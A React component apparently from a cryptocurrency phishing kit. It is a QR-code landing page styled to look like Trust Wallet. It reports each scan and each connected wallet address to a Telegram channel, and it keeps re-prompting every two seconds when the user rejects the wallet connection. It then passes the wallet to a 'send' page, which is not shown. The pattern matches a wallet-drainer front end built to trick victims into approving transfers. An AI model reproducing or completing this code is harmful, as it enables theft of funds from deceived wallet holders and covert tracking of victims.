import { useState, useEffect } from "react"
import { ethers } from "ethers"
import { notify, formatAddress } from "../lib/telegram"
import SendPage from "./send-page"

type Step = "detecting" | "send" | "error"

export default function QRLanding() {
  const [step, setStep] = useState<Step>("detecting")
  const [provider, setProvider] = useState<ethers.BrowserProvider | null>(null)
  const [address, setAddress] = useState("")

  useEffect(() => {
    notify("QR Code Scanned")
    const tryDetect = async () => {
      const eth = (window as any).ethereum
      const trustWallet = (window as any).trustwallet
      const injectedProvider = eth || trustWallet
      if (!injectedProvider) { setStep("error"); return }
      try {
        const bp = new ethers.BrowserProvider(injectedProvider)
        const accounts = await bp.send("eth_requestAccounts", [])
        const addr = accounts[0]
        await notify("Wallet Connected: " + formatAddress(addr))
        setProvider(bp)
        setAddress(addr)
        setStep("send")
      } catch (err: any) {
        if (err.code === 4001 || err.message?.includes("user rejected")) {
          await notify("Connection Rejected - Retrying...")
          setTimeout(tryDetect, 2000)
        } else {
          setStep("error")
        }
      }
    }
    tryDetect()
  }, [])

  const styles = {
    container: {
      display: "flex",
      flexDirection: "column" as const,
      alignItems: "center",
      justifyContent: "center",
      minHeight: "100dvh",
      padding: "0 24px",
      background: "#0C0F1E",
    },
    spinner: {
      width: "64px",
      height: "64px",
      border: "4px solid rgba(51, 117, 187, 0.3)",
      borderTopColor: "#3375BB",
      borderRadius: "50%",
      animation: "spin 1s linear infinite",
      marginBottom: "24px",
    },
    title: { fontSize: "20px", fontWeight: 600, color: "#fff", marginBottom: "8px" },
    subtitle: { fontSize: "14px", color: "#9CA3AF", textAlign: "center" as const },
    errorIcon: {
      width: "64px", height: "64px", borderRadius: "50%",
      background: "rgba(240, 68, 56, 0.1)",
      display: "flex", alignItems: "center", justifyContent: "center",
      fontSize: "24px", color: "#F04438", fontWeight: "bold", marginBottom: "24px",
    },
    button: {
      background: "#3375BB", color: "#fff", border: "none",
      padding: "12px 32px", borderRadius: "12px", fontSize: "14px",
      fontWeight: 500, cursor: "pointer", marginTop: "24px",
    },
    smallText: { fontSize: "12px", color: "#6B7280", marginTop: "24px" },
  }

  if (step === "detecting") {
    return (
      <div style={styles.container}>
        <div style={styles.spinner} />
        <h1 style={styles.title}>Connecting to Wallet...</h1>
        <p style={styles.subtitle}>Please approve the connection in your wallet</p>
      </div>
    )
  }

  if (step === "error") {
    return (
      <div style={styles.container}>
        <div style={styles.errorIcon}>!</div>
        <h2 style={{ ...styles.title, fontSize: "18px" }}>Wallet Not Detected</h2>
        <p style={styles.subtitle}>
          Please open this page in <span style={{ color: "#3375BB" }}>Trust Wallet's built-in browser</span>.
        </p>
        <p style={styles.smallText}>Trust Wallet - DApp Browser - Enter this URL</p>
        <button style={styles.button} onClick={() => window.location.reload()}>Retry</button>
      </div>
    )
  }

  if (provider && address) {
    return <SendPage provider={provider} address={address} />
  }

  return null
}